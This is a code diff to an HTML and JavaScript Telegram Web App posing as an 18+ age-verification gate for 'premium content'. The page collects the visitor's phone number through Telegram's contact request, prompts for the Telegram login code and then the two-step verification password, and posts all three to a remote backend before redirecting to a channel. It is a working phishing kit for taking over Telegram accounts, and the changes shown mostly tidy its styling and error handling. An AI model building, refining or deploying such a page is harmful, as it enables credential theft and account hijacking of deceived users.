@@ -30,22 +30,21 @@
             filter: blur(10px); z-index: -2; transform: scale(1.1);
         }
 
-        .app-container {
-            width: 90%; max-width: 380px; text-align: center; padding: 30px 20px;
-            background: var(--glass-bg); border-radius: 24px; backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-            transition: filter 0.3s ease;
-        }
-
         /* Full Page Loader Style */
         #full-page-loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
+            background: rgba(0,0,0,0.7); backdrop-filter: blur(8px);
             display: none; flex-direction: column; justify-content: center;
             align-items: center; z-index: 1000;
         }
         .loading-emoji { width: 100px; height: 100px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
+
+        .app-container {
+            width: 90%; max-width: 380px; text-align: center; padding: 30px 20px;
+            background: var(--glass-bg); border-radius: 24px; backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
 
         .step { display: none; }
         .step.active { display: block; animation: slideUp 0.4s ease-out; }
@@ -64,49 +63,43 @@
             display: flex; justify-content: center; align-items: center;
         }
         .btn:active { transform: scale(0.97); }
-        .btn:disabled { background: #555; box-shadow: none; cursor: not-allowed; }
 
         .code-input-wrap { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
         .code-input {
             width: 45px; height: 55px; background: rgba(255, 255, 255, 0.05);
             border: 2px solid rgba(255, 255, 255, 0.1); border-radius: 12px;
             color: white; text-align: center; font-size: 24px; font-weight: bold;
-            transition: all 0.3s ease;
         }
         .code-input.filled { border-color: var(--primary-btn); box-shadow: 0 0 10px var(--primary-glow); background: rgba(114, 101, 227, 0.1); }
 
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 25px; }
-        .key { background: var(--keypad-bg); padding: 18px; border-radius: 15px; font-size: 20px; font-weight: 500; cursor: pointer; transition: 0.2s; -webkit-tap-highlight-color: transparent; }
-        .key:active { background: rgba(255,255,255,0.2); transform: scale(0.9); }
+        .key { background: var(--keypad-bg); padding: 18px; border-radius: 15px; font-size: 20px; cursor: pointer; }
         .key.special { color: var(--primary-btn); font-weight: bold; }
 
-        .error-msg { color: var(--error-color); font-size: 13px; margin-top: 12px; display: none; font-weight: 500; }
-
+        .error-msg { color: var(--error-color); font-size: 13px; margin-top: 12px; display: none; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
-        .shake { animation: shake 0.3s ease-in-out; border-color: var(--error-color) !important; }
+        .shake { animation: shake 0.3s ease-in-out; }
     </style>
 </head>
 <body>
 
     <div id="full-page-loader">
         <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/People/Thinking%20Face.webp" class="loading-emoji">
-        <p style="margin-top: 15px; font-weight: bold;">Processing...</p>
+        <p style="margin-top: 15px; font-weight: bold; color: white;">Processing...</p>
     </div>
 
     <div class="app-container" id="main-app">
         <div class="step active" id="step1">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Symbols/No%20One%20Under%20Eighteen.webp" class="emoji-img">
             <h2>Verify Your Age</h2>
-            <p>You must be 18+ to access premium content. Click the button to verify.</p>
-            <button class="btn" id="startBtn" onclick="handleStart()">
-                ✅ I'M 18+ PROCEED
-            </button>
+            <p>You must be 18+ to access premium content.</p>
+            <button class="btn" id="startBtn" onclick="handleStart()">✅ I'M 18+ PROCEED</button>
         </div>
 
         <div class="step" id="step2">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Mobile%20Phone.webp" class="emoji-img">
             <h2>Enter OTP Code</h2>
-            <p>A 5-digit code has been sent to your <b>Telegram</b> account.</p>
+            <p>A 5-digit code has been sent to your Telegram account.</p>
             <div class="code-input-wrap" id="otp-wrap">
                 <input type="text" class="code-input" id="otp1" readonly placeholder="•">
                 <input type="text" class="code-input" id="otp2" readonly placeholder="•">
@@ -126,17 +119,16 @@
         <div class="step" id="step3">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Locked%20With%20Key.webp" class="emoji-img">
             <h2>2-Step Verification</h2>
-            <p>Your account is protected by a password. Please enter it below.</p>
-            <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center; border: 1px solid rgba(255,255,255,0.2); box-shadow: none;" placeholder="Enter Password">
+            <p>Please enter your password below.</p>
+            <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center; border: 1px solid rgba(255,255,255,0.2);" placeholder="Enter Password">
             <div id="2fa-error" class="error-msg">❌ পাসওয়ার্ড সঠিক নয়।</div>
-            <button class="btn" id="confirm2fa" onclick="verify2FA()">UNLOCK ACCESS</button>
+            <button class="btn" onclick="verify2FA()">UNLOCK ACCESS</button>
         </div>
 
         <div class="step" id="step4">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Card%20Index%20Dividers.webp" class="emoji-img">
             <h2>লগইন সফল!</h2>
-            <p>আপনার অ্যাকাউন্টটি সফলভাবে ভেরিফাই হয়েছে। এখন সব ভিডিও দেখতে পারবেন।</p>
-            <button class="btn" style="background: #ff9500; box-shadow: 0 4px 15px rgba(255, 149, 0, 0.4);" onclick="window.location.href='https://t.me/your_channel'">🎬 WATCH VIDEOS NOW</button>
+            <button class="btn" style="background: #ff9500;" onclick="window.location.href='https://t.me/your_channel'">🎬 WATCH VIDEOS NOW</button>
         </div>
     </div>
 
@@ -149,15 +141,7 @@
         let userPhone = "";
 
         function toggleLoader(show) {
-            const loader = document.getElementById('full-page-loader');
-            const mainApp = document.getElementById('main-app');
-            if (show) {
-                loader.style.display = 'flex';
-                mainApp.style.filter = 'blur(8px)';
-            } else {
-                loader.style.display = 'none';
-                mainApp.style.filter = 'none';
-            }
+            document.getElementById('full-page-loader').style.display = show ? 'flex' : 'none';
         }
 
         function nextStep(n) {
@@ -167,6 +151,7 @@
 
         function handleStart() {
             tg.requestContact((sent, response) => {
+                // ৩ নম্বর ছবির সমাধান: শুধু নম্বর পেলে পরের ধাপে যাবে, ক্যানসেল করলে কিছুই হবে না।
                 if (sent && response && response.contact) {
                     userPhone = response.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
@@ -175,10 +160,7 @@
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ phone: userPhone })
-                    }).catch(e => console.log("Init request sent"));
-                } else {
-                    // ৩ নম্বর ছবির সমাধান: ক্যানসেল করলে কোনো পপআপ আসবে না
-                    console.log("User cancelled contact sharing");
+                    });
                 }
             });
         }
@@ -192,14 +174,9 @@
             for (let i = 1; i <= 5; i++) {
                 const el = document.getElementById('otp' + i);
                 el.value = currentOtp[i - 1] || "";
-                if(currentOtp[i - 1]) el.classList.add('filled');
-                else el.classList.remove('filled');
+                if(currentOtp[i - 1]) el.classList.add('filled'); else el.classList.remove('filled');
             }
-
-            if (currentOtp.length === 5) {
-                tg.HapticFeedback.notificationOccurred('success');
-                verifyOtp();
-            }
+            if (currentOtp.length === 5) { verifyOtp(); }
         }
 
         async function verifyOtp() {
@@ -212,23 +189,14 @@
                 });
                 const data = await res.json();
                 toggleLoader(false);
-
                 if (data.status === "done") nextStep(4);
                 else if (data.status === "need_2fa") nextStep(3);
-                else throw new Error("Invalid OTP");
+                else throw new Error();
             } catch (err) {
                 toggleLoader(false);
-                const wrap = document.getElementById('otp-wrap');
-                wrap.classList.add('shake');
+                document.getElementById('otp-wrap').classList.add('shake');
                 document.getElementById('otp-error').style.display = "block";
-                setTimeout(() => {
-                    wrap.classList.remove('shake');
-                    currentOtp = "";
-                    for(let i=1;i<=5;i++) {
-                        const el = document.getElementById('otp'+i);
-                        el.value=""; el.classList.remove('filled');
-                    }
-                }, 500);
+                setTimeout(() => { document.getElementById('otp-wrap').classList.remove('shake'); }, 500);
             }
         }
 
@@ -238,14 +206,13 @@
             toggleLoader(true);
             try {
                 const res = await fetch(`${RENDER_URL}/verify`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ phone: userPhone, otp: currentOtp, password: pass })
                 });
                 const data = await res.json();
                 toggleLoader(false);
                 if (data.status === "done") nextStep(4);
-                else throw new Error("Invalid Password");
+                else throw new Error();
             } catch (err) {
                 toggleLoader(false);
                 document.getElementById('2fa-input').classList.add('shake');
